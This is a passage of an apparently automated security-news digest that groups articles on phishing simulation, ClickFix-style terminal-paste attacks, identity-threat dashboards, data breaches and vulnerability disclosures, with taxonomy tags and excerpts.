verification window, press Ctrl + V. Press Enter on your keyboard to finish. They are then asked to paste this command into their terminal using a set of key combinations. Cybercriminals weaponize these standard system shortcuts to prompt victims to unknowingly download infostealers, malware, and malicious RATs/RMM tools. See demo here : https://phishingdefense.org/phishing/command-execution-demo?trial=1 Why it works: Exploits Troubleshooting Habits : Users are deeply conditioned to follow step-by-step technical instructions to resolve any roadblocks in access. Bypasses "Download Anxiety": Standard security awareness has successfully taught users to fear downloading and opening random .exe files. This attack sidesteps that reflex entirely by providing a keyboard combo done in the terminal instead, which prompts a GUI-less download entirely. Help users question suspicious ins
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Next-Gen Phishing Tactics Users Aren’t Ready For | Huntress
  - Published: 2026-08-28T16:00:00+00:00
  - Link: https://www.huntress.com/blog/advanced-phishing-tradecraft
  - Summary: Move past basic credential harvesting. Discover how modern attackers use ClickFix, BitB, and OAuth consent phishing—and how to train your users with Huntress SAT.

### Cluster e708e1b504 — score 8

- Title: Teach Yourself to Phish | Huntress
- Source: Huntress (detection_response_operations)
- Published: 2026-08-28T16:00:00+00:00
- Link: https://www.huntress.com/blog/teach-yourself-to-phish-the-strategy-behind-phishing-simulations
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_products: OpenAI/ChatGPT, Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Get ready for a phishing trip! Learn about the strategy behind phishing simulations and how it can help your organization build resilience against real phishing threats.
```

#### Full body

```
Home Blog Teach Yourself to Phish: The Strategy Behind Phishing Simulations Last Updated: August 28, 2026 Teach Yourself to Phish: The Strategy Behind Phishing Simulations By: Chris Henderson Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Security awareness training is easy to think about as a passive item. You go buy a training platform or SCORM files for your LMS, assign the annual training, set it to nag your people to watch the video, and you’re done. While that approach certainly will fulfill some of the compliance requirements to perform annual security awareness training, is it actually improving the security posture of your organization? Humans are both our biggest cybersecurity risk and our best detection engine. While humans and their identities are the target for initial access on most modern breaches, they are also far more capable of detecting ‘weird’ stuff than security tools. The proper security awareness training program minimizes the risk posed by your employees while also improving their response times when they detect something is off. Spending the extra time to bolster the human detection capabilities is some of the best ROI you can achieve in the security space. At Huntress, we train our human detection capabilities in two ways: First - Monthly security awareness training. Every month our staff receive new training to watch, using our very own Security Awareness Training product. This is to keep security front of mind and ensure a base level of security acumen across the workforce. We use these to reinforce good cyber hygiene while also educating our staff on the tactics used by adversaries. (Want us to manage those monthly trainings on your behalf? Check out our managed learning option ) Second - Monthly (or more frequent) phishing simulations. We do these frequently and celebrate individual failures. Tracking the organizational failure rates and adjusting the phishing lures you use accordingly builds resilience. Why Phishing Simulations? Social engineering is an attack on the psychological traits we have as humans: an innate desire to be helpful, trusting of strangers, and a fear of getting in trouble. Attackers leverage techniques of fear, intimidation, urgency, empathy, compensation, or authority in order to spike an adrenaline response to their message. Their goal is to spike your ‘fight or flight’ response so you don’t stop and logically think about an email. Attackers take advantage of the psychological traits we have the same way they exploit vulnerabilities on a server. They find a vulnerable asset and exploit that vulnerability in order to gain initial access to a system. Simulated phishing has the same desired outcome as vulnerability scanning your servers. We want to know where there are weaknesses so we can address them. Said differently, we are enumerating our human attack surface. Turn phishing practice into lasting resilience Effective phishing simulations are designed to change behavior, not to punish employees or create a one-time compliance event. See how Huntress Managed SAT makes realistic practice part of a broader security-awareness strategy. Phishing simulations have three goals: 1. Exposure therapy By regularly using the same psychological exploits social engineers use, we lessen their impact and reduce the likelihood of an adrenaline response. In order to increase organizational resilience, you should rotate the tactics used in your monthly simulations each campaign. 2. Identify your most vulnerable Some of your users will be more susceptible to social engineering attacks either due to a heightened sense of trust or a lack of technical knowledge required to inspect an email for legitimacy. A single failure is a learning opportunity in and of itself. Celebrate when someone fails and owns their failure; they are going to be far less likely to click next time. However, a series of failures is an indication the user needs individualized help. Spend your time training
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Teach Yourself to Phish | Huntress
  - Published: 2026-08-28T16:00:00+00:00
  - Link: https://www.huntress.com/blog/teach-yourself-to-phish-the-strategy-behind-phishing-simulations
  - Summary: Get ready for a phishing trip! Learn about the strategy behind phishing simulations and how it can help your organization build resilience against real phishing threats.

### Cluster 23e7bb8425 — score 8

- Title: A Beginner’s Guide to Phishing Simulation Training for Employees | Huntress
- Source: Huntress (detection_response_operations)
- Published: 2026-08-28T16:00:00+00:00
- Link: https://www.huntress.com/blog/a-beginners-guide-to-phishing-simulation-training-for-employees
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Learn the essentials of phishing simulation training with our beginner's guide. Protect your organization by simulating real phishing attacks.
```

#### Full body

```
Home Blog A Beginner’s Guide to Phishing Simulation Training for Employees Last Updated: August 28, 2026 A Beginner’s Guide to Phishing Simulation Training for Employees By: Team Huntress Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Unless you’ve been living under a rock, everyone knows what phishing is and most likely has received or even fallen for a phishing email themselves. So at this point, there should be no excuse, right? Wrong. While it’s apparent we all know what we’re up against, the facts still show that we continue to fall victim to these attacks. Therefore, the only way you’ll be able to build up your defenses and mitigate against phishing attacks is through practice. That’s where phishing training comes in handy for you and your employees. Starting your phishing simulation training program as a part of your security awareness routine is the first step to better protecting your organization. To help you get moving, we’ll walk you through the steps of how to run a phishing simulation and create an action plan based on the results you find with Huntress. What is Phishing Training? The purpose of a phishing simulation training program is to let employees experience a real-world phishing attack in a safe place. It helps regularly gauge where your organization lands in its risk of experiencing an attack. As a result, phishing simulation training should educate and create a lasting impact on your employee’s ability to make better decisions when confronted with phishing emails. These decisions can create outcomes like not clicking links, reporting suspicious emails, taking a moment to pause instead of being manipulated by a sense of urgency, and being more transparent about security threats. A far too common misconception of phishing training is to treat it as a way to scrutinize employees. And even more drastically docking pay or letting someone go because of it. More often than not it’s going to be less about the individual and more about the process that’s been set up to help people learn. A phishing simulation test can be compared to taking a test in school. A test is not the same as an entire year of learning. Phishing tests alone are not the same as a training program, that’s like taking a test your first day of school which will determine your grade — that wouldn’t be very useful. But rather these phishing tests are a good temperature check to see what needs improving and a way to apply what you’ve learned to do better next time. See a phishing simulation from the inside A phishing simulation gives employees a safe way to experience a realistic attack and learn from the outcome. Watch the video before reviewing the setup process to see how Huntress SAT connects scenarios, learner actions, and follow-up training. How phishing simulations work The organization’s admin will have the option to pick from a number of real-life phishing scenarios to send out to their employees. It’s up to each employee to ignore it, report it, or click it. Once completed, the administrator will be able to analyze the results and access the severity of the organization’s risk for the phishing simulation test. This process should be repeated frequently to continue to monitor results and get an accurate depiction of what your organization is up against in the real world. For all organizations, we recommend a minimum of monthly phishing testing with employees. **It’s important to note that the employee phishing training program is not designed to test your technical infrastructure on how well it defends against phishing. That’s a different series of tests. A true phishing simulation test is designed to educate your employees on how well they defend against phishing emails. This is where the term whitelisting comes into play, which we will get to in our step-by-step guide. Why make phishing training fun? Despite the status quo, we don’t want phishing simulations to sound all doom and gloom. Our mission is to flip the scrip
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: A Beginner’s Guide to Phishing Simulation Training for Employees | Huntress
  - Published: 2026-08-28T16:00:00+00:00
  - Link: https://www.huntress.com/blog/a-beginners-guide-to-phishing-simulation-training-for-employees
  - Summary: Learn the essentials of phishing simulation training with our beginner's guide. Protect your organization by simulating real phishing attacks.

### Cluster cfca87e086 — score 8

- Title: New Huntress Managed ITDR Dashboard: Faster Identity Investigations
- Source: Huntress (detection_response_operations)
- Published: 2026-08-27T14:00:00+00:00
- Link: https://www.huntress.com/blog/managed-itdr-dashboard-redesigned
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Huntress’ redesigned Managed ITDR dashboard adds Rapid Identity Triage, Failed Login Characterization, and Quick SIEM search for faster investigations.
```

#### Full body

```
Home Blog The New Huntress Managed ITDR Dashboard: More Context. Faster Answers. Published: August 27, 2026 The New Huntress Managed ITDR Dashboard: More Context. Faster Answers. By: Erin Meyers Summarize with AI Summarize ChatGPT Claude Perplexity Google AI When an employee says, "I clicked a link. Am I compromised?" you probably don't want to spend the next 20 minutes jumping between tools, logs, and screens trying to piece together an answer. You want to know what happened. You want the context to decide whether it matters. And if something is wrong, you want to be able to act. That's the idea behind the new Huntress Managed ITDR dashboard, now generally available to all ITDR customers. The redesigned dashboard brings more identity data, investigation context, and self-service capabilities into one place, giving you a clearer view of what's happening across the identities you protect and faster ways to investigate when something doesn't look right. But this launch is about more than a new dashboard. It represents where we're taking Huntress Managed ITDR next. New Huntress Managed ITDR Dashboard Managed ITDR Should Do More Than Tell You When Something Is Wrong Huntress Managed ITDR was built around a simple reality: attackers increasingly target identities, and stopping them requires more than generating another alert. That's why the Huntress Security Operations Center (SOC) investigates identity threats for you and takes action when malicious activity is detected. But not every security question begins with a Huntress incident. Sometimes it starts with an employee reporting something suspicious. An unusual login. A worried client calling their managed service provider (MSP). Or an IT administrator who simply wants to understand what happened with a particular identity. Those moments require something different: fast access to the evidence needed to investigate and validate identity activity yourself. Historically, that context could be spread across different parts of the product. The redesigned dashboard begins bringing it together. Instead of functioning primarily as a status page, the new dashboard is designed to become a more actionable identity investigation surface: a place to see active risk, understand what Huntress is investigating, dig deeper into identity activity, and take action when necessary. The result is a Managed ITDR experience that gives you more proof, more context, and a clearer place to start. Rapid Identity Triage: Go From "Is This User Compromised?" to Answers Faster One of the biggest additions to the dashboard is Rapid Identity Triage, built specifically for those moments when you need to investigate a user quickly. Rapid Identity Triage enables speedy identity searches Search for an identity by email address to immediately see their activity from the past 24 hours, along with current risk signals and incident context. From a single view, you can examine recent sign-ins, locations, VPN or proxy usage, browsers, failed login activity, and other contexts that can help you understand whether behavior looks expected or suspicious. An AI-assisted Quick Summary also helps surface the important details without requiring you to manually piece together every event. Need to dig further? Expand the activity window to 48 hours or seven days. Need to share what you found? Export the activity timeline. And if the investigation shows that immediate action is warranted, you can revoke active sessions or disable the account directly from the dashboard. Rapid Identity Triage turns a common security question into a workflow: find the identity, understand the activity, and take action without bouncing between screens. Failed Login Characterization: Put Failed Logins in Context A failed login by itself doesn't tell you much. Where it came from (and the infrastructure behind it) can tell you a lot more. Clear view of login activity across locations, VPNs, residential proxies, tunnels, and datacenters Failed Login Chara
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: New Huntress Managed ITDR Dashboard: Faster Identity Investigations
  - Published: 2026-08-27T14:00:00+00:00
  - Link: https://www.huntress.com/blog/managed-itdr-dashboard-redesigned
  - Summary: Huntress’ redesigned Managed ITDR dashboard adds Rapid Identity Triage, Failed Login Characterization, and Quick SIEM search for faster investigations.

### Cluster 4dd30410e7 — score 8

- Title: How Developers Prevent Production Risk at the Source
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-09-03T00:31:46+00:00
- Link: https://www.wiz.io/blog/prevent-production-risk-at-code-stage
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: no_patch_yet, zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day, no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Fixing security vulnerabilities in code takes seconds, while patching in production creates high operational costs and risk. Discover how empowering developers as your first line of defense eliminates exposure across every phase of your software pipeline.
```

#### Full body

```
A developer pulls node:20-slim as a base image. It's a sensible default and what most documentation reaches for. It also ships with 14 known CVEs, three of them critical. Caught in the Dockerfile, fixing it takes a one line change. Swap the image tag, commit, keep moving. That's a few seconds of developer focus. Caught in production, you're patching every live container running that image. You need a maintenance window, service ownership across teams, and regression testing. Before any of that begins, your incident team has to answer one question. How long was this image reachable, and did anyone exploit it? Same 14 CVEs. Two drastically different bills. That cost gap isn't new, but frontier AI models are drastically accelerating the clock alongside it. Finding a flaw, confirming reachability, and writing a functional exploit used to require days of skilled manual research. Today, AI agents can analyze open source commits, identify unpatched CVEs, and generate working zero-day exploits in minutes, which represents a shift that has already been documented across real-world web applications. Reconnaissance runs continuously, weaponization happens at machine speed, and the window between a public fix and an automated attack has virtually vanished. Patching faster is necessary, but it hits a hard floor set by deployment cycles. The real solution is creating less vulnerable code in the first place and resolving risk long before the production clock starts ticking. Why Security at the Code Stage Costs Fractionally Less Shift left security isn't about throwing another scanner at developers. It's about engineering economics. Three dynamics make fixing issues in code exponentially cheaper. The fix stays localized. In code, you modify the source. In production, you fix every instance the source created. One line in a Dockerfile versus dozens of running microservices. Risk scales as it travels. In code, it hasn't gone anywhere. Context is fresh. The expensive part of a fix isn't typing code, it's rebuilding context. A developer who wrote a function an hour ago understands the logic and intent. A developer handed a ticket for code written last quarter has to pause everything to rebuild that mental map. Long feedback loops destroy throughput. The exposure window never opens. A production finding forces an immediate investigation into blast radius and exposure. A code level finding carries zero exposure. There's no blast radius to calculate because the risk was never live. Aligning Security Controls with Pipeline Pace If a security check slows down deployment or breaks a workflow, developers will bypass it. That isn't a discipline problem, it's what happens when controls block delivery goals. Security checks must match the pace of the pipeline stage they occupy. In the agent session. Catching issues directly inside the IDE or AI workspace gives you the fastest, cheapest fix available. Pattern-based problems like hardcoded secrets, bad defaults, and vulnerable packages get flagged instantly. The person or AI writing code holds the context to fix it immediately, keeping exposure at absolute zero. At commit and push. Sitting right at the local repository gate, this stage acts as a baseline policy guardrail. Catching a leaked credential or policy violation here stops bad code from ever entering git history, where rotation gets expensive. Clean commits become the standard outcome. On the pull request. Authorization flaws, business logic gaps, and architectural weak spots only show up when analyzing how a change fits into the broader codebase. Because pull requests represent a natural pause in delivery, deeper analysis fits right into the workflow without disrupting engineering momentum. Against the repository. Committing code to version control doesn't automatically mean it goes to production. Continuous repository scanning acts as a preventive gate. Scheduled scans or merge triggers catch vulnerabilities, secret leaks , and misconfigurations lo
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: How Developers Prevent Production Risk at the Source
  - Published: 2026-09-03T00:31:46+00:00
  - Link: https://www.wiz.io/blog/prevent-production-risk-at-code-stage
  - Summary: Fixing security vulnerabilities in code takes seconds, while patching in production creates high operational costs and risk. Discover how empowering developers as your first line of defense eliminates exposure across every phase of your software pipeline.

### Cluster 48fdfd437c — score 8

- Title: Aesto Health says data breach affects over 9.5 million patients
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-01T19:28:17+00:00
- Link: https://www.bleepingcomputer.com/news/security/aesto-health-says-data-breach-affects-over-95-million-patients/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Aesto LLC, operating as Aesto Health, disclosed that a data breach discovered recently affects more than 9.5 million individuals. [...]
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Aesto Health says data breach affects over 9.5 million patients
  - Published: 2026-09-01T19:28:17+00:00
  - Link: https://www.bleepingcomputer.com/news/security/aesto-health-says-data-breach-affects-over-95-million-patients/
  - Summary: Aesto LLC, operating as Aesto Health, disclosed that a data breach discovered recently affects more than 9.5 million individuals. [...]

### Cluster f849c6ebf3 — score 8

- Title: Getting started with Mantis, our open-source bug finding-and-fixing harness
- Source: Google Cloud Security (cloud_identity_infrastructure)
- Published: 2026-09-02T16:00:00+00:00
- Link: https://cloud.google.com/blog/products/identity-security/getting-started-with-the-mantis-harness-to-find-and-fix-bugs/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
AI models have clearly proven their ability to discover and exploit vulnerabilities without much, if any, human assistance. To help defenders gain the advantage with AI, we built the Mantis harness to automate the discovery, triage, reproduction, and patching of software vulnerabilities. Available to all as an open-source framework, Mantis is part of Google’s internal approach to find and fix vulnerabilities at machine-speed. It creates a more effective scalable, context-aware repository analysis. While sloppiness in AI code scanning frequently leads to hallucinated bugs and weak true-positive rates under 7%, we designed Mantis to be effective by combining industry-standard agentic techniques like critic and review agents with sandboxed reproduction of vulnerabilities for grounding. As we detailed in June , it examines the history of the repository to learn from past security fixes and automatically builds up architectural and threat model documentation, even if these are not provided.
```

#### Corroborating sources (1)

- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Getting started with Mantis, our open-source bug finding-and-fixing harness
  - Published: 2026-09-02T16:00:00+00:00
  - Link: https://cloud.google.com/blog/products/identity-security/getting-started-with-the-mantis-harness-to-find-and-fix-bugs/
  - Summary: AI models have clearly proven their ability to discover and exploit vulnerabilities without much, if any, human assistance. To help defenders gain the advantage with AI, we built the Mantis harness to automate the discovery, triage, reproduction, and patching of software vulnerabilities. Available to all as an open-source framework, Mantis is part of Google’s internal approach to find and fix vulnerabilities at machine-speed. It creates a more effective scalable, context-aware repository analysis. While sloppiness in AI code scanning frequently leads to hallucinated bugs and weak true-positive rates under 7%, we designed Mantis to be effective by combining industry-standard agentic techniques like critic and review agents with sandboxed reproduction of vulnerabilities for grounding. As we detailed in June , it examines the history of the repository to learn from past security fixes and automatically builds up architectural and threat model documentation, even if these are not provided.

### Cluster 28d45bac1a — score 8

- Title: UK Moves to Block High-Risk Tech Suppliers From Critical Infrastructure
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-02T15:45:08+00:00
- Link: https://www.securityweek.com/uk-moves-to-block-high-risk-tech-suppliers-from-critical-infrastructure/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_industries: critical_infrastructure
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Late amendments to the Cyber Security and Resilience Bill would give ministers new powers to restrict risky technology providers as supply chain attacks intensify. The post UK Moves to Block High-Risk Tech Suppliers From Critical Infrastructure appeared first on SecurityWeek .
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: UK Moves to Block High-Risk Tech Suppliers From Critical Infrastructure
  - Published: 2026-09-02T15:45:08+00:00
  - Link: https://www.securityweek.com/uk-moves-to-block-high-risk-tech-suppliers-from-critical-infrastructure/
  - Summary: Late amendments to the Cyber Security and Resilience Bill would give ministers new powers to restrict risky technology providers as supply chain attacks intensify. The post UK Moves to Block High-Risk Tech Suppliers From Critical Infrastructure appeared first on SecurityWeek .

### Cluster 9039b8053c — score 8

- Title: Exploit Published for Fresh Cleo Harmony Vulnerability
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-02T12:18:15+00:00
- Link: https://www.securityweek.com/exploit-published-for-fresh-cleo-harmony-vulnerability/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
The security defect allows remote attackers to bypass authentication through argument bearer manipulation. The post Exploit Published for Fresh Cleo Harmony Vulnerability appeared first on SecurityWeek .
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Exploit Published for Fresh Cleo Harmony Vulnerability
  - Published: 2026-09-02T12:18:15+00:00
  - Link: https://www.securityweek.com/exploit-published-for-fresh-cleo-harmony-vulnerability/
  - Summary: The security defect allows remote attackers to bypass authentication through argument bearer manipulation. The post Exploit Published for Fresh Cleo Harmony Vulnerability appeared first on SecurityWeek .

### Cluster 08ec474efa — score 8

- Title: The Transaction Is the Last Step, Not the First
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-02T17:08:19+00:00
- Link: https://www.team-cymru.com/post/fraud-defense-ft3-attack-patterns
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Waiting for the transaction to catch fraud? You're already too late. Learn how tracking attack patterns in threat intelligence stops actors early.
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: The Transaction Is the Last Step, Not the First
  - Published: 2026-09-02T17:08:19+00:00
  - Link: https://www.team-cymru.com/post/fraud-defense-ft3-attack-patterns
  - Summary: Waiting for the transaction to catch fraud? You're already too late. Learn how tracking attack patterns in threat intelligence stops actors early.

### Cluster 713e97e0d2 — score 8

- Title: APT28-Linked HOOKEDGE Backdoor Targets European Government and Diplomatic Organizations
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-28T08:20:59+00:00
- Link: https://thehackernews.com/2026/08/apt28-linked-hookedge-backdoor-targets.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: APT28

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- actor_attribution: APT28
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- actor_attribution: APT28
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Cybersecurity researchers have flagged a fresh set of campaigns targeting government and diplomatic organizations in Romania, Spain, and Türkiye between late September 2025 and early April 2026. These campaigns, per Recorded Future Insikt Group, have led to the deployment of a previously undocumented backdoor dubbed HOOKEDGE, a lightweight Windows batch script that's distributed via
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: APT28-Linked HOOKEDGE Backdoor Targets European Government and Diplomatic Organizations
  - Published: 2026-08-28T08:20:59+00:00
  - Link: https://thehackernews.com/2026/08/apt28-linked-hookedge-backdoor-targets.html
  - Summary: Cybersecurity researchers have flagged a fresh set of campaigns targeting government and diplomatic organizations in Romania, Spain, and Türkiye between late September 2025 and early April 2026. These campaigns, per Recorded Future Insikt Group, have led to the deployment of a previously undocumented backdoor dubbed HOOKEDGE, a lightweight Windows batch script that's distributed via

### Cluster 8c1deb8826 — score 8

- Title: Nutex Health Says Patient Data Stolen, Hackers Threaten Leak
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-09-02T10:45:00+00:00
- Link: https://www.infosecurity-magazine.com/news/nutex-patient-data-stolen/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: financial_services, healthcare
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_industries: healthcare, financial_services
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The US healthcare provider confirmed that sensitive patient and employee data, alongside financial and business information, were exfiltrated by a third party
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Nutex Health Says Patient Data Stolen, Hackers Threaten Leak
  - Published: 2026-09-02T10:45:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/nutex-patient-data-stolen/
  - Summary: The US healthcare provider confirmed that sensitive patient and employee data, alongside financial and business information, were exfiltrated by a third party

### Cluster 32f0368f4d — score 8

- Title: GeoNetwork - Pre-Auth RCE via Unauthenticated File Upload and Unsafe XSLT Processor (4 CVEs, 121 government deployments, all patched)
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-09-01T09:29:24+00:00
- Link: https://www.reddit.com/r/netsec/comments/1w46vwa/geonetwork_preauth_rce_via_unauthenticated_file/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- affected_industries: government
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/ZealousidealHunter80 [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: GeoNetwork - Pre-Auth RCE via Unauthenticated File Upload and Unsafe XSLT Processor (4 CVEs, 121 government deployments, all patched)
  - Published: 2026-09-01T09:29:24+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1w46vwa/geonetwork_preauth_rce_via_unauthenticated_file/
  - Summary: submitted by /u/ZealousidealHunter80 [link] [comments]
